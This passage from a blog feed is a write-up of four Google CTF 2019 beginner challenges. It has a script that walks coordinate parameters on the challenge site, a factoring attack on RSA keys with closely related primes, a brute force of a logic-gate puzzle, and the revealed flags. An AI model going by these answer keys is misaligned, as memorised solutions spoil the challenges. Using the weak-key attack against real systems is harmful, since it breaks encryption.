    <content type="html"><![CDATA[<h2 id="09-Drive-to-the-target-coding"><a href="#09-Drive-to-the-target-coding" class="headerlink" title="09 Drive to the target(coding)"></a>09 Drive to the target(coding)</h2><ul><li><a href="https://drivetothetarget.web.ctfcompetition.com/">https://drivetothetarget.web.ctfcompetition.com/</a></li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Driving to the target</span><br><span class="line">Hurry up, don&#x27;t be late for you rendez-vous!</span><br><span class="line"></span><br><span class="line">Pick your direction</span><br><span class="line">51.6498  0.0982  go</span><br></pre></td></tr></table></figure><ul><li>when we change the number, the web will tips :<br>You went 44m at a speed of 21km/h. You are getting away…<br>Woa, were about to move at 126318km/h, this is too fast!<br>…</li><li>the url has 3 parameters:<code>lat</code> <code>lon</code> <code>token</code>,<a href="https://drivetothetarget.web.ctfcompetition.com/?lat=51.6508&amp;lon=3.1001&amp;token=gAAAAABdjLCgmVVSZCgN5-oaDZn9wJnMyNh-EuBXjx1vuSEaMEt4rmB4okyhbOWTOFVo8W4ttBuFX6-7z8A1dqNbzm1XMpVJVDdwj7vQCxPqYYA_Wlrhz_7cbEL61hfMst4nAlYhlNtR">https://drivetothetarget.web.ctfcompetition.com/?lat=51.6508&amp;lon=3.1001&amp;token=gAAAAABdjLCgmVVSZCgN5-oaDZn9wJnMyNh-EuBXjx1vuSEaMEt4rmB4okyhbOWTOFVo8W4ttBuFX6-7z8A1dqNbzm1XMpVJVDdwj7vQCxPqYYA_Wlrhz_7cbEL61hfMst4nAlYhlNtR</a></li><li>in the 2-d maps we should calculate the right directoin lat-lon, and get the flag</li><li>calculate.py</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_coordinates</span>(<span class="params">url</span>):</span></span><br><span class="line"></span><br><span class="line">    page = requests.get(url).content</span><br><span class="line">    soup = bs4.BeautifulSoup(page, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"></span><br><span class="line">    cLat = float(soup.find(<span class="string">&quot;input&quot;</span>, attrs=&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lat&quot;</span>&#125;)[<span class="string">&quot;value&quot;</span>])</span><br><span class="line">    cLon = float(soup.find(<span class="string">&quot;input&quot;</span>, attrs=&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lon&quot;</span>&#125;)[<span class="string">&quot;value&quot;</span>])</span><br><span class="line">    tken = soup.find(<span class="string">&quot;input&quot;</span>, attrs=&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;token&quot;</span>&#125;)[<span class="string">&quot;value&quot;</span>]</span><br><span class="line">    stat = <span class="number">-1</span> <span class="keyword">if</span> <span class="string">&quot;away&quot;</span> <span class="keyword">in</span> soup.text <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [cLat, cLon], tken, stat</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">args</span>):</span></span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;https://drivetothetarget.web.ctfcompetition.com/&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(args) == <span class="number">0</span>:</span><br><span class="line">        pair, token, stat = get_coordinates(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pair, token, stat = get_coordinates(args[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    done   = <span class="literal">False</span></span><br><span class="line">    switch = <span class="literal">False</span></span><br><span class="line">    before = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    step = <span class="number">0.0001</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> switch:</span><br><span class="line">            params = <span class="string">&quot;?lat=%.4f&amp;lon=%.4f&amp;token=%s&quot;</span> % (pair[<span class="number">0</span>], pair[<span class="number">1</span>] + step, token)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            params = <span class="string">&quot;?lat=%.4f&amp;lon=%.4f&amp;token=%s&quot;</span> % (pair[<span class="number">0</span>] + step, pair[<span class="number">1</span>], token)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pair, token, stat = get_coordinates(url + params)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(url + params)</span><br><span class="line">            quit()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( stat == <span class="number">-1</span> <span class="keyword">and</span> before == <span class="number">-1</span> ):</span><br><span class="line">            step *= <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> switch <span class="keyword">and</span> ( stat == <span class="number">-1</span> <span class="keyword">and</span> before == <span class="number">0</span> ):</span><br><span class="line">            switch   = <span class="literal">True</span></span><br><span class="line">            pair[<span class="number">1</span>] -= step</span><br><span class="line">        <span class="keyword">elif</span> switch <span class="keyword">and</span> ( stat == <span class="number">-1</span> <span class="keyword">and</span> before == <span class="number">0</span> ):</span><br><span class="line">            print(url + params)</span><br><span class="line">            quit()</span><br><span class="line"></span><br><span class="line">        before = stat</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;%.4f, %.4f&quot;</span> % (pair[<span class="number">0</span>], pair[<span class="number">1</span>]), <span class="string">&quot;: Closer&quot;</span> <span class="keyword">if</span> <span class="keyword">not</span> stat <span class="keyword">else</span> <span class="string">&quot;: Further&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv[<span class="number">1</span>::])</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@r10  ~/google_ctf  python3 calculate.py</span><br><span class="line">51.6498, 0.0983 : Further</span><br><span class="line">51.6498, 0.0984 : Further</span><br><span class="line">51.6498, 0.0983 : Closer</span><br><span class="line">51.6498, 0.0982 : Closer</span><br><span class="line">51.6498, 0.0981 : Closer</span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li>finily get </li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lat=51 .4921 , lon= -01929</span><br><span class="line">Congratulations, you made it, here is the flag: CTF&#123;Who_isardis_Ormandy&#125;</span><br></pre></td></tr></table></figure><ul><li>==<strong>flag:CTF{Who_is_Tardis_Ormandy}</strong>==</li></ul><h2 id="10-Crypto-Caulingo-crypto"><a href="#10-Crypto-Caulingo-crypto" class="headerlink" title="10 Crypto Caulingo(crypto)"></a>10 Crypto Caulingo(crypto)</h2><ul><li>check files information</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/10_crypto_caulingo</span><br><span class="line">╰─➤  file *</span><br><span class="line">crypto.zip:     Zip archive data, at least v2.0 to extract</span><br><span class="line">msg.txt:        ASCII text, with very long lines</span><br><span class="line">project_dc.pdf: PDF document, version 1.5</span><br></pre></td></tr></table></figure><ul><li>msg.txt</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n:</span><br><span class="line">17450892350509567071590987572582143158927907441748820483575144211411640241849663641180283816984167447652133133054833591585389505754635416604577584488321462013117163124742030681698693455489404696371546386866372290759608301392572928615767980244699473803730080008332364994345680261823712464595329369719516212105135055607592676087287980208987076052877442747436020751549591608244950255761481664468992126299001817410516694015560044888704699389291971764957871922598761298482950811618390145762835363357354812871474680543182075024126064364949000115542650091904557502192704672930197172086048687333172564520657739528469975770627</span><br><span class="line"></span><br><span class="line">e:</span><br><span class="line">65537</span><br><span class="line"></span><br><span class="line">msg:</span><br><span class="line">50fb0b3f17315f7dfa25378fa0b06c8d955fad0493365669bbaa524688128ee9099ab713a3369a5844bdd99a5db98f333ef55159d3025630c869216889be03120e3a4bd6553d7111c089220086092bcffc5e42f1004f9888f25892a7ca007e8ac6de9463da46f71af4c8a8f806bee92bf79a8121a7a34c3d564ac7f11b224dc090d97fdb427c10867ad177ec35525b513e40bef3b2ba3e6c97cb31d4fe3a6231fdb15643b84a1ce704838d8b99e5b0737e1fd30a9cc51786dcac07dcb9c0161fc754cda5380fdf3147eb4fbe49bc9821a0bcad98d6df9fbdf63cf7d7a5e4f6cbea4b683dfa965d0bd51f792047e393ddd7b7d99931c3ed1d033cebc91968d43f</span><br></pre></td></tr></table></figure><ul><li>check project_dc.pdf, we find <code>RSA</code></li><li>use RSA encryption to get the clear msg. n is very big ,but primes p, q composing the modulus are subject to the following constraint:</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">|a*p-b*q| &lt; 10000, with 1 &lt;= a,b &lt;= 1000.</span><br><span class="line">=&gt;</span><br><span class="line">a * p ≈ b * q</span><br><span class="line">-&gt; a / b * p ≈ q</span><br><span class="line">-&gt; a / b * p * q ≈ q * q</span><br><span class="line">-&gt; a / b * N ≈ q^2</span><br><span class="line">-&gt; q^2 ≈ N / b * a</span><br><span class="line">-&gt; q ≈ sqrt(N / b * a)</span><br></pre></td></tr></table></figure><ul><li>use bruteforce find a and b, then find q and q (p*q=n)</li><li>solution.py</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> mpz, isqrt, invert, powmod</span><br><span class="line"></span><br><span class="line">n = mpz(<span class="number">17450892350509567071590987572582143158927907441748820483575144211411640241849663641180283816984167447652133133054833591585389505754635416604577584488321462013117163124742030681698693455489404696371546386866372290759608301392572928615767980244699473803730080008332364994345680261823712464595329369719516212105135055607592676087287980208987076052877442747436020751549591608244950255761481664468992126299001817410516694015560044888704699389291971764957871922598761298482950811618390145762835363357354812871474680543182075024126064364949000115542650091904557502192704672930197172086048687333172564520657739528469975770627</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">c = bytes_to_long(bytes.fromhex(<span class="string">&#x27;50fb0b3f17315f7dfa25378fa0b06c8d955fad0493365669bbaa524688128ee9099ab713a3369a5844bdd99a5db98f333ef55159d3025630c869216889be03120e3a4bd6553d7111c089220086092bcffc5e42f1004f9888f25892a7ca007e8ac6de9463da46f71af4c8a8f806bee92bf79a8121a7a34c3d564ac7f11b224dc090d97fdb427c10867ad177ec35525b513e40bef3b2ba3e6c97cb31d4fe3a6231fdb15643b84a1ce704838d8b99e5b0737e1fd30a9cc51786dcac07dcb9c0161fc754cda5380fdf3147eb4fbe49bc9821a0bcad98d6df9fbdf63cf7d7a5e4f6cbea4b683dfa965d0bd51f792047e393ddd7b7d99931c3ed1d033cebc91968d43f&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_pq</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">1001</span>):</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> range(a, <span class="number">1001</span>):</span><br><span class="line">            est_q = isqrt(n // b * a)</span><br><span class="line">            <span class="keyword">for</span> q <span class="keyword">in</span> range(est_q - <span class="number">100</span>, est_q + <span class="number">100</span>):</span><br><span class="line">                <span class="keyword">if</span> n % q == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> n // q, q</span><br><span class="line"></span><br><span class="line">p, q = solve_pq(n)</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line"></span><br><span class="line">msg = long_to_bytes(powmod(c, d, n))</span><br><span class="line">print(msg.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">⚡ ⚙ root@r10  ~/google_ctf  python3 solution.py</span><br><span class="line">Hey there!</span><br><span class="line"></span><br><span class="line">If you are able to decrypt this message, you must a life form with high intelligence!</span><br><span class="line"></span><br><span class="line">Therefore, we would like to invite you to our dancing party! </span><br><span class="line"></span><br><span class="line">Here’s your invitation code: CTF&#123;017d72f0b513e89830bccf5a36306ad944085a47&#125;</span><br></pre></td></tr></table></figure><ul><li>==<strong>flag:CTF{017d72f0b513e89830bccf5a36306ad944085a47}</strong>==</li></ul><h2 id="11-Gate-lock-hardware"><a href="#11-Gate-lock-hardware" class="headerlink" title="11 Gate lock(hardware)"></a>11 Gate lock(hardware)</h2><ul><li>unzip the file, and check the information</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/11_gate_lock</span><br><span class="line">╰─➤  ll</span><br><span class="line">total 1.4M</span><br><span class="line">drwxrwxrwx 1 r10 r10 4.0K May 21 06:06 beginner</span><br><span class="line">-rwxrwxrwx 1 r10 r10 686K Dec 31  1979 challenge.tgz</span><br><span class="line">-rwxrwxrwx 1 r10 r10 686K Jun 23 03:31 gate_lock.zip</span><br><span class="line"></span><br><span class="line">╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/11_gate_lock</span><br><span class="line">╰─➤  <span class="built_in">cd</span> beginner</span><br><span class="line"></span><br><span class="line">╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/11_gate_lock/beginner</span><br><span class="line">╰─➤  ll</span><br><span class="line">total 5.6M</span><br><span class="line">-rwxrwxrwx 1 r10 r10  24K May 21 06:06 auth.sqlite</span><br><span class="line">-rwxrwxrwx 1 r10 r10  588 May 21 06:06 env_meta.txt</span><br><span class="line">-rwxrwxrwx 1 r10 r10    9 May 21 06:06 force_loaded.txt</span><br><span class="line">-rwxrwxrwx 1 r10 r10    0 May 21 06:06 ipban.txt</span><br><span class="line">-rwxrwxrwx 1 r10 r10 5.6M May 21 06:06 map.sqlite</span><br><span class="line">-rwxrwxrwx 1 r10 r10  783 May 21 06:06 map_meta.txt</span><br><span class="line">-rwxrwxrwx 1 r10 r10    9 May 21 06:06 mesecon_actionqueue</span><br><span class="line">-rwxrwxrwx 1 r10 r10  36K May 21 06:06 players.sqlite</span><br><span class="line">drwxrwxrwx 1 r10 r10 4.0K May 20 22:49 schems</span><br><span class="line">-rwxrwxrwx 1 r10 r10  611 May 21 06:19 world.mt</span><br><span class="line"></span><br><span class="line">╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/11_gate_lock/beginner</span><br><span class="line">╰─➤  file *</span><br><span class="line">auth.sqlite:         SQLite 3.x database, last written using SQLite version 3028000</span><br><span class="line">env_meta.txt:        ASCII text, with very long lines</span><br><span class="line">force_loaded.txt:    ASCII text, with no line terminators</span><br><span class="line">ipban.txt:           empty</span><br><span class="line">map.sqlite:          SQLite 3.x database, last written using SQLite version 3028000</span><br><span class="line">map_meta.txt:        ASCII text</span><br><span class="line">mesecon_actionqueue: ASCII text, with no line terminators</span><br><span class="line">players.sqlite:      SQLite 3.x database, last written using SQLite version 3028000</span><br><span class="line">schems:              directory</span><br><span class="line">world.mt:            ASCII text</span><br></pre></td></tr></table></figure><ul><li>this is a world in game minetest, load the world, show a map of logic gates.</li><li>analyze the map and caiculate </li><li>world.py</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">first_stage</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        x[<span class="number">2</span>] <span class="keyword">and</span> <span class="keyword">not</span> x[<span class="number">3</span>],</span><br><span class="line">        x[<span class="number">4</span>] <span class="keyword">or</span> x[<span class="number">5</span>],</span><br><span class="line">        x[<span class="number">14</span>] <span class="keyword">or</span> x[<span class="number">6</span>],</span><br><span class="line">        x[<span class="number">9</span>] <span class="keyword">and</span> <span class="keyword">not</span> x[<span class="number">1</span>],</span><br><span class="line">        x[<span class="number">20</span>] <span class="keyword">and</span> <span class="keyword">not</span> x[<span class="number">18</span>],</span><br><span class="line">        x[<span class="number">17</span>] <span class="keyword">or</span> x[<span class="number">19</span>],</span><br><span class="line">        x[<span class="number">7</span>] <span class="keyword">and</span> <span class="keyword">not</span> x[<span class="number">6</span>],</span><br><span class="line">        x[<span class="number">16</span>] <span class="keyword">or</span> x[<span class="number">8</span>],</span><br><span class="line">        x[<span class="number">10</span>] <span class="keyword">or</span> <span class="keyword">not</span> x[<span class="number">2</span>],</span><br><span class="line">        x[<span class="number">12</span>] <span class="keyword">or</span> <span class="keyword">not</span> x[<span class="number">4</span>],</span><br><span class="line">        x[<span class="number">2</span>] <span class="keyword">or</span> <span class="keyword">not</span> x[<span class="number">10</span>],</span><br><span class="line">        x[<span class="number">5</span>] <span class="keyword">or</span> <span class="keyword">not</span> x[<span class="number">13</span>],</span><br><span class="line">        x[<span class="number">11</span>] <span class="keyword">and</span> x[<span class="number">3</span>],</span><br><span class="line">        x[<span class="number">13</span>] <span class="keyword">or</span> <span class="keyword">not</span> x[<span class="number">5</span>],</span><br><span class="line">        x[<span class="number">4</span>] <span class="keyword">or</span> <span class="keyword">not</span> x[<span class="number">12</span>],</span><br><span class="line">        x[<span class="number">14</span>] <span class="keyword">and</span> x[<span class="number">6</span>],</span><br><span class="line">        x[<span class="number">15</span>] <span class="keyword">and</span> x[<span class="number">7</span>],</span><br><span class="line">        x[<span class="number">15</span>] <span class="keyword">or</span> x[<span class="number">7</span>],</span><br><span class="line">        x[<span class="number">11</span>] <span class="keyword">or</span> x[<span class="number">3</span>]</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">second_stage</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        x[<span class="number">1</span>] <span class="keyword">and</span> <span class="keyword">not</span> x[<span class="number">2</span>],</span><br><span class="line">        x[<span class="number">3</span>] <span class="keyword">and</span> x[<span class="number">4</span>],</span><br><span class="line">        x[<span class="number">5</span>] <span class="keyword">and</span> <span class="keyword">not</span> x[<span class="number">6</span>],</span><br><span class="line">        x[<span class="number">7</span>] <span class="keyword">and</span> <span class="keyword">not</span> x[<span class="number">8</span>],</span><br><span class="line">        x[<span class="number">10</span>] <span class="keyword">and</span> x[<span class="number">11</span>],</span><br><span class="line">        x[<span class="number">12</span>] <span class="keyword">and</span> <span class="keyword">not</span> x[<span class="number">13</span>],</span><br><span class="line">        x[<span class="number">14</span>] <span class="keyword">and</span> x[<span class="number">15</span>],</span><br><span class="line">        x[<span class="number">16</span>] <span class="keyword">or</span> x[<span class="number">17</span>],</span><br><span class="line">        x[<span class="number">18</span>] <span class="keyword">and</span> x[<span class="number">19</span>]</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">third_stage</span>(<span class="params">x,f</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        x[<span class="number">1</span>] <span class="keyword">and</span> x[<span class="number">2</span>],</span><br><span class="line">        x[<span class="number">3</span>] <span class="keyword">and</span> x[<span class="number">4</span>],</span><br><span class="line">        x[<span class="number">5</span>] <span class="keyword">and</span> f[<span class="number">9</span>],</span><br><span class="line">        x[<span class="number">6</span>] <span class="keyword">and</span> x[<span class="number">7</span>],</span><br><span class="line">        x[<span class="number">8</span>] <span class="keyword">or</span> <span class="keyword">not</span> x[<span class="number">9</span>]</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fourth_stage</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        x[<span class="number">1</span>] <span class="keyword">and</span> x[<span class="number">2</span>],</span><br><span class="line">        x[<span class="number">4</span>] <span class="keyword">and</span> <span class="keyword">not</span> x[<span class="number">5</span>]</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">circuit</span>(<span class="params">arr</span>):</span></span><br><span class="line">    f = first_stage(arr)</span><br><span class="line">    f = [<span class="literal">None</span>] + f</span><br><span class="line">    s = second_stage(f)</span><br><span class="line">    s = [<span class="literal">None</span>] + s</span><br><span class="line">    t = third_stage(s,f)</span><br><span class="line">    t= [<span class="literal">None</span>] + t</span><br><span class="line">    f4 = fourth_stage(t)</span><br><span class="line">    last = f4[<span class="number">0</span>] <span class="keyword">and</span> (f4[<span class="number">1</span>] <span class="keyword">and</span> t[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">return</span> last</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>():</span></span><br><span class="line">    <span class="keyword">for</span> arr <span class="keyword">in</span> product([<span class="literal">True</span>,<span class="literal">False</span>],repeat=<span class="number">20</span>):</span><br><span class="line">        l = list(arr)</span><br><span class="line">        l = [<span class="literal">None</span>] + l</span><br><span class="line">        <span class="keyword">if</span> circuit(l):</span><br><span class="line">            <span class="keyword">return</span> arr</span><br><span class="line"></span><br><span class="line">sol = solution()</span><br><span class="line">print(<span class="string">&#x27;CTF&#123;&#123;&#123;&#125;&#125;&#125;&#x27;</span>.format(</span><br><span class="line">    <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;1&#x27;</span> <span class="keyword">if</span> sol[i] <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>)])</span><br><span class="line">    ))</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/11_gate_lock</span><br><span class="line">╰─➤  python3 world.py</span><br><span class="line">CTF&#123;01000010111001000001&#125;</span><br></pre></td></tr></table></figure><ul><li>==<strong>flag:CTF{01000010111001000001}</strong>==</li></ul><h2 id="12-Ad-ad"><a href="#12-Ad-ad" class="headerlink" title="12 Ad(ad)"></a>12 Ad(ad)</h2><ul><li><p><a href="https://www.youtube.com/watch?v=QzFuwljOj8Y">https://www.youtube.com/watch?v=QzFuwljOj8Y</a></p></li><li><p>watch the video, find the flag in the video</p></li><li><p>==<strong>flag:CTF{9e796ca74932912c216a1cd00c25c84fae00e139}</strong>==</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>goolge ctf 2019 stage1 writeup_part_2</title>
    <link href="/2019/10/02/google_ctf_2019_stage1_writeup_2/"/>
    <url>/2019/10/02/google_ctf_2019_stage1_writeup_2/</url>
    
